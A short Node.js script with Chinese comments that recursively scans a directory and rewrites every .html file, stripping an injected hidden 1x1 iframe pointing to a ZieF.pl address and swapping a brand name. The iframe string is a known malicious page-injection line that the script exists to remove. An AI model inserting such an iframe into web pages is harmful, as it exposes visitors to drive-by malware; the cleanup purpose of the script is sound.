
var fs = require('fs');
// var path = "目标路径..";
// var path = "D:\\Web1710\\script";
var path = "..\\";

function readDirectory(dirPath) {
    if (fs.existsSync(dirPath)) {
        var files = fs.readdirSync(dirPath);
        
        files.forEach(function(file) {
            var filePath = dirPath + "/" + file;
            var stats = fs.statSync(filePath);
            if (stats.isDirectory()) {
                console.log('\n读取目录：\n', filePath, "\n");
                readDirectory(filePath);
            } else if (stats.isFile()) {

				if (filePath.indexOf(".html") > 0) {


					fs.readFile(filePath, "utf8", function(err, data){  
						if(err)  
							console.log("读取文件fail " + err);  
						else{  
							// 读取成功时  
							// console.log(data);// 直接输出中文字符串了  

							var str = data;

							// 快压 地址
							str = str.replace('<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>', "");

							// 快压 地址
							str = str.replace('传智播客', "Web前端");

							fs.writeFile(filePath, str, "utf8");

						}  
					});  

					// var buff = fs.readFileSync(filePath);


					// var str = buff.toString();

					// str = str.replace('<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>', "");

					// // if (buff[0].toString(16).toLowerCase() == "ef" && buff[1].toString(16).toLowerCase() == "bb" && buff[2].toString(16).toLowerCase() == "bf") {
					// //     //EF BB BF 239 187 191
					// //     console.log('\发现BOM文件：', filePath, "\n");
					// //     buff = buff.slice(3);
					// //     fs.writeFile(filePath, buff.toString(), "utf8");
					// // }

					// fs.writeFile(filePath, str, "utf8");

					// console.log(filePath);
				}
            }
        });       
    } else {
        console.log('Not Found Path : ', dirPath);
    }
}

readDirectory(path);


